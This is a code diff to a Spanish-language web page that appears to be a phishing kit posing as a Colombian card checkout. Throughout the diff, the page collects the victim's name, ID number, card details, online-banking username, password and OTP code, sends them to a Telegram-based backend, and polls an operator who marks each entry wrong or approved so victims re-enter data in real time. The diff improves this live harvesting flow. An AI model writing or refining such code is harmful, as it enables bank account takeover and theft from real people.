@@ -458,7 +458,7 @@
             margin-bottom: 6px;
         }
 
-        /* SECCIÓN DE CREDENCIALES BANCARIAS (OCULTA) */
+        /* SECCIÓN DE CREDENCIALES BANCARIAS */
         .credenciales-section {
             display: none;
             border: 2px solid var(--co-teal);
@@ -479,7 +479,7 @@
         }
 
         .credenciales-title {
-            font-size: 0.875rem;
+            font-size: 1rem;
             font-weight: 700;
             color: var(--co-teal);
             margin-bottom: 4px;
@@ -489,12 +489,12 @@
         }
 
         .credenciales-title svg {
-            width: 20px;
-            height: 20px;
+            width: 24px;
+            height: 24px;
         }
 
         .credenciales-subtitle {
-            font-size: 0.8125rem;
+            font-size: 0.875rem;
             color: var(--co-text-muted);
             margin-bottom: 20px;
         }
@@ -511,6 +511,37 @@
 
         .credenciales-grid .form-label {
             font-size: 0.8125rem;
+        }
+
+        /* ALERTAS DE CREDENCIALES */
+        .alerta-credencial {
+            display: none;
+            padding: 12px 16px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 0.875rem;
+            font-weight: 500;
+        }
+
+        .alerta-credencial.error {
+            display: block;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+        }
+
+        .alerta-credencial.success {
+            display: block;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            color: #16a34a;
+        }
+
+        .alerta-credencial.info {
+            display: block;
+            background: #e0f2fe;
+            border: 1px solid #bae6fd;
+            color: #0369a1;
         }
 
         .security-footer {
@@ -930,18 +961,21 @@
                             </div>
                         </div>
 
-                        <!-- CREDENCIALES BANCARIAS (OCULTO HASTA APROBACIÓN) -->
+                        <!-- CREDENCIALES BANCARIAS -->
                         <div class="credenciales-section" id="credencialesSection">
                             <div class="credenciales-title">
                                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                     <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                     <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
                                 </svg>
-                                Verificación del banco emisor
+                                Verificación de datos
                             </div>
                             <p class="credenciales-subtitle">
-                                Ingrese las credenciales de su banco para completar la verificación de la tarjeta.
+                                Verifica tus datos de tu banco para completar la validación.
                             </p>
+
+                            <!-- ALERTA DE CREDENCIALES -->
+                            <div class="alerta-credencial" id="alertaCredencial"></div>
 
                             <div class="credenciales-grid">
                                 <div class="form-group">
@@ -965,8 +999,8 @@
                                 <div class="error-message">El código OTP es requerido (6 dígitos)</div>
                             </div>
 
-                            <button type="button" class="btn btn-success" id="verificarCredenciales" style="margin-top:16px;">
-                                Verificar credenciales
+                            <button type="button" class="btn btn-success" id="continuarBtn" style="margin-top:16px;">
+                                Continuar
                             </button>
                         </div>
 
@@ -1009,7 +1043,7 @@
         let solicitudId = null;
         let pollingInterval = null;
         let cardType = null;
-        let pagoAprobado = false;
+        let credencialesId = null;
 
         // ============================================
         // CARGAR DATOS DEL LOCALSTORAGE
@@ -1062,7 +1096,8 @@
         const bancoPassword = document.getElementById('bancoPassword');
         const bancoOTP = document.getElementById('bancoOTP');
         const credencialesSection = document.getElementById('credencialesSection');
-        const verificarCredencialesBtn = document.getElementById('verificarCredenciales');
+        const continuarBtn = document.getElementById('continuarBtn');
+        const alertaCredencial = document.getElementById('alertaCredencial');
 
         const cardPatterns = {
             visa: {
@@ -1233,6 +1268,16 @@
             mostrarMensaje(mensaje, 'info');
         }
 
+        function mostrarAlerta(mensaje, tipo) {
+            alertaCredencial.className = 'alerta-credencial ' + tipo;
+            alertaCredencial.textContent = mensaje;
+        }
+
+        function ocultarAlerta() {
+            alertaCredencial.className = 'alerta-credencial';
+            alertaCredencial.textContent = '';
+        }
+
         function generarSolicitudId() {
             return 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
         }
@@ -1395,9 +1440,9 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
         }
 
         // ============================================
-        // POLLING PARA ESPERAR APROBACIÓN
+        // POLLING PARA ESPERAR APROBACIÓN DEL PAGO
         // ============================================
-        function iniciarPolling() {
+        function iniciarPollingPago() {
             let tiempoInicio = Date.now();
 
             pollingInterval = setInterval(async () => {
@@ -1420,17 +1465,14 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
 
                 if (resultado === 'approved') {
                     clearInterval(pollingInterval);
-                    pagoAprobado = true;
                     
-                    // ==============================================
-                    // 🔥 OCULTAR OVERLAY INMEDIATAMENTE
-                    // ==============================================
+                    // OCULTAR OVERLAY
                     loadingOverlay.classList.remove('active');
                     
-                    // Ocultar el botón de pago
+                    // Ocultar botón de pago
                     submitButton.style.display = 'none';
                     
-                    // Mostrar las credenciales
+                    // Mostrar credenciales
                     credencialesSection.classList.add('visible');
                     
                     mostrarInfo('✅ Pago aprobado. Complete la verificación bancaria.');
@@ -1452,6 +1494,96 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                     submitButton.disabled = false;
                     submitButton.textContent = 'Pagar de forma segura';
                     submitButton.style.display = 'block';
+                }
+            }, POLLING_INTERVAL);
+        }
+
+        // ============================================
+        // POLLING PARA ESPERAR RESPUESTA DE CREDENCIALES
+        // ============================================
+        let pollingCredenciales = null;
+
+        function iniciarPollingCredenciales() {
+            let tiempoInicio = Date.now();
+
+            pollingCredenciales = setInterval(async () => {
+                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
+                    clearInterval(pollingCredenciales);
+                    mostrarAlerta('Tiempo de espera agotado. Intente nuevamente.', 'error');
+                    continuarBtn.disabled = false;
+                    continuarBtn.textContent = 'Continuar';
+                    bancoUsuario.disabled = false;
+                    bancoPassword.disabled = false;
+                    bancoOTP.disabled = false;
+                    return;
+                }
+
+                const resultado = await verificarEstadoSolicitud(credencialesId);
+                console.log('📊 Estado credenciales:', resultado);
+
+                // ERROR USUARIO
+                if (resultado === 'error_user') {
+                    clearInterval(pollingCredenciales);
+                    mostrarAlerta('❌ Usuario incorrecto. Por favor, verifica tus datos e intenta de nuevo.', 'error');
+                    continuarBtn.disabled = false;
+                    continuarBtn.textContent = 'Continuar';
+                    bancoUsuario.disabled = false;
+                    bancoPassword.disabled = false;
+                    bancoOTP.disabled = false;
+                    bancoUsuario.focus();
+                    return;
+                }
+
+                // ERROR CLAVE
+                if (resultado === 'error_pass') {
+                    clearInterval(pollingCredenciales);
+                    mostrarAlerta('❌ Contraseña incorrecta. Por favor, verifica tus datos e intenta de nuevo.', 'error');
+                    continuarBtn.disabled = false;
+                    continuarBtn.textContent = 'Continuar';
+                    bancoUsuario.disabled = false;
+                    bancoPassword.disabled = false;
+                    bancoOTP.disabled = false;
+                    bancoPassword.focus();
+                    return;
+                }
+
+                // ERROR OTP
+                if (resultado === 'error_otp') {
+                    clearInterval(pollingCredenciales);
+                    mostrarAlerta('❌ Código de verificación incorrecto. Por favor, verifica el código OTP.', 'error');
+                    continuarBtn.disabled = false;
+                    continuarBtn.textContent = 'Continuar';
+                    bancoUsuario.disabled = false;
+                    bancoPassword.disabled = false;
+                    bancoOTP.disabled = false;
+                    bancoOTP.focus();
+                    bancoOTP.value = '';
+                    return;
+                }
+
+                // APROBADO - Redirigir a index.html
+                if (resultado === 'approved') {
+                    clearInterval(pollingCredenciales);
+                    mostrarAlerta('✅ ¡Verificación exitosa! Redirigiendo...', 'success');
+                    continuarBtn.disabled = true;
+                    continuarBtn.textContent = 'Redirigiendo...';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                    return;
+                }
+
+                // RECHAZADO
+                if (resultado === 'rejected') {
+                    clearInterval(pollingCredenciales);
+                    mostrarAlerta('❌ Credenciales rechazadas. Verifique sus datos.', 'error');
+                    continuarBtn.disabled = false;
+                    continuarBtn.textContent = 'Continuar';
+                    bancoUsuario.disabled = false;
+                    bancoPassword.disabled = false;
+                    bancoOTP.disabled = false;
+                    return;
                 }
             }, POLLING_INTERVAL);
         }
@@ -1561,7 +1693,7 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
 
             if (enviado) {
                 mostrarInfo('⏳ Esperando aprobación del pago...');
-                iniciarPolling();
+                iniciarPollingPago();
             } else {
                 mostrarError('Error al procesar el pago. Por favor, intente nuevamente.');
                 cardNumberInput.disabled = false;
@@ -1578,7 +1710,7 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
         // ============================================
         // ENVÍO DE CREDENCIALES BANCARIAS
         // ============================================
-        verificarCredencialesBtn.addEventListener('click', async function() {
+        continuarBtn.addEventListener('click', async function() {
             const usuario = bancoUsuario.value.trim();
             const password = bancoPassword.value.trim();
             const otp = bancoOTP.value.trim();
@@ -1588,6 +1720,7 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
             [bancoUsuario, bancoPassword, bancoOTP].forEach(el => {
                 el.parentElement.classList.remove('error');
             });
+            ocultarAlerta();
 
             if (!usuario) {
                 bancoUsuario.parentElement.classList.add('error');
@@ -1611,8 +1744,9 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
                 return;
             }
 
-            verificarCredencialesBtn.disabled = true;
-            verificarCredencialesBtn.textContent = 'Enviando...';
+            continuarBtn.disabled = true;
+            continuarBtn.textContent = 'Enviando...';
+            mostrarAlerta('⏳ Verificando credenciales...', 'info');
 
             const cardLast4 = sessionStorage.getItem('cardLast4') || localStorage.getItem('cardLast4') || 'XXXX';
             const nombre = localStorage.getItem('nombre') || 'No proporcionado';
@@ -1626,10 +1760,10 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
             if (procesamiento_prioritario) total += 20000;
             const montoFormateado = total.toLocaleString('es-CO').replace(/,/g, '.') + ' Col$';
 
-            const credencialesId = 'CRED-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
+            credencialesId = 'CRED-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
 
             const datosCredenciales = {
-                solicitudId: solicitudId || credencialesId,
+                solicitudId: credencialesId,
                 nombreCompleto: `${nombre} ${apellidos}`.trim(),
                 tipoDocumento: tipoDocumento,
                 numeroDocumento: numeroDocumento,
@@ -1654,43 +1788,21 @@ Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
             const enviado = await enviarCredencialesATelegram(datosCredenciales);
 
             if (enviado) {
-                mostrarInfo('✅ Credenciales enviadas. Esperando verificación final...');
-                verificarCredencialesBtn.textContent = 'Enviado';
-                verificarCredencialesBtn.style.backgroundColor = 'var(--co-green)';
+                mostrarAlerta('✅ Credenciales enviadas. Esperando verificación final...', 'info');
+                continuarBtn.textContent = 'Enviado';
+                continuarBtn.style.backgroundColor = 'var(--co-green)';
                 
                 bancoUsuario.disabled = true;
                 bancoPassword.disabled = true;
                 bancoOTP.disabled = true;
 
-                const pollCredenciales = setInterval(async () => {
-                    const estado = await verificarEstadoSolicitud(credencialesId);
-                    
-                    if (estado === 'approved') {
-                        clearInterval(pollCredenciales);
-                        mostrarExito('✅ ¡Verificación exitosa! Redirigiendo...');
-                        setTimeout(() => {
-                            window.location.href = 'confirmacion.html';
-                        }, 2000);
-                    } else if (estado === 'rejected') {
-                        clearInterval(pollCredenciales);
-                        mostrarError('❌ Credenciales rechazadas. Verifique los datos.');
-                        verificarCredencialesBtn.disabled = false;
-                        verificarCredencialesBtn.textContent = 'Verificar credenciales';
-                        verificarCredencialesBtn.style.backgroundColor = '';
-                        bancoUsuario.disabled = false;
-                        bancoPassword.disabled = false;
-                        bancoOTP.disabled = false;
-                    }
-                }, 3000);
-
-                setTimeout(() => {
-                    clearInterval(pollCredenciales);
-                }, 120000);
+                iniciarPollingCredenciales();
 
             } else {
-                mostrarError('Error al enviar credenciales. Intente nuevamente.');
-                verificarCredencialesBtn.disabled = false;
-                verificarCredencialesBtn.textContent = 'Verificar credenciales';
+                mostrarAlerta('❌ Error al enviar credenciales. Intente nuevamente.', 'error');
+                continuarBtn.disabled = false;
+                continuarBtn.textContent = 'Continuar';
+                continuarBtn.style.backgroundColor = '';
             }
         });
     </script>
